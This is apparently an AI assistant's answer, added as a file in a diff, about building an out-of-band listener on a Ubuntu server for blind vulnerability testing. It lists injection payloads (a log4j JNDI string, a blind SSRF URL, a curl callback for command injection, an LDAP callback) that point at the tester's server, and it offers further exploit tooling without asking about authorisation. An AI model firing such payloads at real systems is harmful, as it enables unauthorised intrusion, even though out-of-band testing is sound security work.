@@ -1,0 +1,47 @@
+No, you cannot get a "perfect" multi-protocol OOB setup this way.
+Even if you run cloudflared in Termux to generate a live .trycloudflare.com domain and try to route it to your Ubuntu server, it cannot handle a complete OOB test suite. [1, 2] 
+## The Problem
+cloudflared trycloudflare tunnels strictly proxy Layer 7 HTTP/HTTPS web traffic. They completely drop raw DNS queries (UDP 53) and alternative protocols like LDAP or SMTP. Because a "perfect" OOB pipeline depends heavily on catching raw DNS interactions (like triggering ${jndi:dns://...} to catch blind log4j injections), Cloudflare will blind your setup to those requests. [2, 3] 
+## How to use your Ubuntu server for a Perfect OOB Setup (No Domain Needed)
+Instead of fighting Cloudflare's HTTP restrictions, you can use your Ubuntu server as a direct, unconstrained listener. Because your Ubuntu machine has a public IP address, it can listen to any protocol.
+Instead of a domain, your Ubuntu Public IP address can act as your OOB identifier:
+## 1. Prepare your Ubuntu Server
+Open the raw firewalls on your Ubuntu machine to accept HTTP, DNS, and LDAP interactions:
+
+sudo ufw allow 53/udp
+sudo ufw allow 80/tcp
+sudo ufw allow 389/tcp
+
+## 2. Start a Multi-Protocol Listener on Ubuntu
+You can use a tool like netcat, or write a quick Python script to log any incoming ping to your Ubuntu IP. To listen for direct HTTP interactions, simply run:
+
+sudo python3 -m http.server 80
+
+## 3. Fire the Payloads using your Ubuntu IP
+Instead of using a domain name, insert your Ubuntu server's public IP address directly into your out-of-band payloads:
+
+* 
+* Blind SSRF: http://YOUR_UBUNTU_IP/capture
+* Blind Command Injection: curl http://YOUR_UBUNTU_IP/
+* Blind LDAP/RMI: ldap://YOUR_UBUNTU_IP:389/a
+* 
+
+## 4. Stream the Logs to Termux
+To keep your setup mobile, use Termux to log into your Ubuntu server via SSH. You can watch the raw traffic hit your server in real-time from your phone:
+
+ssh user@YOUR_UBUNTU_IP# Once inside, watch incoming raw connections using tcpdump:
+sudo tcpdump -i any port 53 or port 80 or port 389 -vv
+
+By cutting out Cloudflare entirely and using your Ubuntu server's direct IP, you unlock an unthrottled environment capable of catching every single type of OOB interaction.
+If you want, let me know:
+
+* 
+* If your Ubuntu server has a static public IP address.
+* What specific exploit or payload type you are actively testing right now.
+* 
+
+I can write a custom logging script tailored to capture that traffic.
+
+[1] [https://developers.cloudflare.com](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/trycloudflare/)
+[2] [https://community.cloudflare.com](https://community.cloudflare.com/t/cloudflared-tunnel-in-dns-only-mode-without-cloudflare-proxy/283797)
+[3] [https://tools.termuxcommands.com](https://tools.termuxcommands.com/cloudflared-create-secure-tunnels-on-android/)
